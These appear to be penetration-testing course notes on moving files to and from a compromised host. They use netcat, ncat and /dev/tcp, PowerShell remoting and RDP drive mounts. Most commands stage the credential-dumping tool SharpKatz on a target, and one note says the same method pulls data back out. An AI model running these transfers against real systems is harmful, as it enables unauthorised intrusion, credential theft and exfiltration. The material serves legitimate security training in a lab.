## delete


# Miscellaneous File Transfer Methods
## File Transfer with Netcat and Ncat
**NetCat - Target Machine - Listening on Port 8000**
```bash
$ nc -l -p 8000 > SharpKatz.exe
```

**Ncat - Target Machine - Listening on Port 8000**
```bash
$ # Example using Ncat
$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```

**Netcat - Attack Host - Sending File to Compromised machine**
```bash
$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe

$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

**Ncat - Attack Host - Sending File to Compromised machine**
```bash
$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe

$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

**Attack Host - Sending File as Input to Netcat**
```bash
$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

**Compromised Machine Connect to Netcat to Receive the File**
```bash
$ nc 192.168.49.128 443 > SharpKatz.exe
```

**Attack Host - Sending File as Input to Ncat**
```bash
$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

**Target Machine Connect to Ncat to Receive the File**
```bash
$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

**NetCat - Sending File as Input to Netcat**
```bash
$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

**Ncat - Sending File as Input to Netcat**
```bash
$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

**Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File**
```bash
$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

`Note: The same operation can be used to transfer files from the compromised host to our Pwnbox.`

## PowerShell Session File Transfer
**From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01**
```bash
> Test-NetConnection -ComputerName DATABASE01 -Port 5985

ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```

**Create a PowerShell Remoting Session to DATABASE01**
```bash
> $Session = New-PSSession -ComputerName DATABASE01
```

**Copy samplefile.txt from our Localhost to the DATABASE01 Session**
```bash
> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

**Copy DATABASE.txt from DATABASE01 Session to our Localhost**
```bash
> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

## RDP
**Mounting a Linux Folder Using rdesktop**
```bash
$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

**Mounting a Linux Folder Using xfreerdp**
```bash
$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

To access the directory, we can connect to \\tsclient\, allowing us to transfer files to and from the RDP session.


Alternatively, from Windows, the native mstsc.exe remote desktop client can be used.

After selecting the drive, we can interact with it in the remote session that follows.

`Note: This drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session.
